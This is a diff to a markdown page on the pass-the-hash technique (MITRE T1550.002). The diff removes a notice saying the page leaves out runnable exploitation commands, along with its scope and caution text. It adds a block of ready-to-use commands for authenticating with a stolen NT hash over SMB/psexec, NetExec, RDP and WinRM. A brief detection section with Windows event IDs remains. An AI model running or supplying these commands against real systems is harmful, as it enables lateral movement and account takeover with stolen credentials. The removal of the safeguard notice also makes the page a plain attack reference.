@@ -10,16 +10,32 @@ mitre: "T1550.002"
 tag: null
 ---
 
+
 # Pass-the-hash
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **NTLM authentication** — the NT hash is the credential.
 
-## Detection
+### Concept (deep)
+NTLM auth accepts the **NT hash** directly — no cracking needed. Works where NTLM is allowed; blocked by Kerberos-only or `RestrictNTLM`.
+
+### Commands
+```bash
+# ── psexec PTH ──────────────────────────────────────────────────────
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<nt> \
+  corp.local/admin@10.10.10.5
+
+# ── NetExec validate ────────────────────────────────────────────────
+nxc smb 10.10.10.5 -u administrator -H <nt>
+
+# ── RDP PTH ──────────────────────────────────────────────────────────
+xfreerdp /v:10.10.10.5 /u:admin /pth:<nt> /cert-ignore
+
+# ── WinRM PTH ────────────────────────────────────────────────────────
+evil-winrm -i 10.10.10.5 -u admin -H <nt>
+```
+
+### Detection
 **4624 type 3** with NTLMSSP for accounts that normally use Kerberos; **4776**; `RestrictNTLM` + Credential Guard.
 
 ---
